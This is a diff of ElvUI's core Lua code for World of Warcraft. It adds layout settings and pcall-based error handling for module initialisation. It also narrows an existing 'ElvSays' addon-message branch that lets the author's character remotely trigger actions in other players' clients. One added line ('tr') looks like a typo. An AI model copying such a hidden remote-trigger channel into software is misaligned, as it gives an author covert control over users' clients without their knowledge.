@@ -26,6 +26,9 @@ E['valueColorUpdateFuncs'] = {};
 E.TexCoords = {.08, .92, .08, .92}
 E.FrameLocks = {}
 E.CreditsList = {};
+E.Spacing = 1;
+E.Border = 2;
+E.PixelMode = tr;
 
 E.InversePoints = {
 	TOP = 'BOTTOM',
@@ -274,6 +277,8 @@ function E:UpdateFontTemplates()
 	end
 end
 
+
+
 --This frame everything in ElvUI should be anchored to for Eyefinity support.
 E.UIParent = CreateFrame('Frame', 'ElvUIParent', UIParent);
 E.UIParent:SetFrameLevel(UIParent:GetFrameLevel());
@@ -436,12 +441,12 @@ local function SendRecieve(self, event, prefix, message, channel, sender)
 	if event == "CHAT_MSG_ADDON" then
 		if sender == E.myname then return end
 
-		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not string.find(sender, 'Elvz%-') and not E.recievedOutOfDateMessage then
+		if prefix == "ElvUIVC" and sender ~= 'Elvz' and not string.find(sender, "Elvz%-Kil'jaeden") and not E.recievedOutOfDateMessage then
 			if E.version ~= 'BETA' and tonumber(message) ~= nil and tonumber(message) > tonumber(E.version) then
 				E:Print(L["Your version of ElvUI is out of date. You can download the latest version from http://www.tukui.org"])
 				E.recievedOutOfDateMessage = true
 			end
-		elseif prefix == 'ElvSays' and (sender == 'Elvz' or string.find(sender, 'Elvz-')) then ---HAHHAHAHAHHA
+		elseif prefix == 'ElvSays' and ((sender == 'Elvz' and E.myrealm == "Kil'jaeden") or string.find(sender, "Elvz%-Kil'jaeden")) then ---HAHHAHAHAHHA
 			local user, channel, msg, sendTo = string.split(',', message)
 			
 			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
@@ -531,7 +536,10 @@ function E:UpdateAll(ignoreInstall)
 	self:UpdateBackdropColors()
 	self:UpdateFrameTemplates()
 	
-	self:GetModule('Layout'):ToggleChatPanels()	
+	local LO = E:GetModule('Layout')
+	LO:ToggleChatPanels()	
+	LO:BottomPanelVisibility()
+	LO:TopPanelVisibility()
 	
 	collectgarbage('collect');
 end
@@ -590,7 +598,10 @@ function E:InitializeInitialModules()
 	for _, module in pairs(E['RegisteredInitialModules']) do
 		local module = self:GetModule(module, true)
 		if module and module.Initialize then
-			module:Initialize()
+			local _, catch = pcall(module.Initialize, module)
+			if catch and GetCVarBool('scriptErrors') == 1 then
+				ScriptErrorsFrame_OnError(catch, false)
+			end
 		end
 	end
 end
@@ -603,8 +614,12 @@ end
 
 function E:InitializeModules()	
 	for _, module in pairs(E['RegisteredModules']) do
-		if self:GetModule(module).Initialize then
-			self:GetModule(module):Initialize()
+		local module = self:GetModule(module)
+		if module.Initialize then
+			local _, catch = pcall(module.Initialize, module)
+			if catch and GetCVarBool('scriptErrors') == 1 then
+				ScriptErrorsFrame_OnError(catch, false)
+			end
 		end
 	end
 end
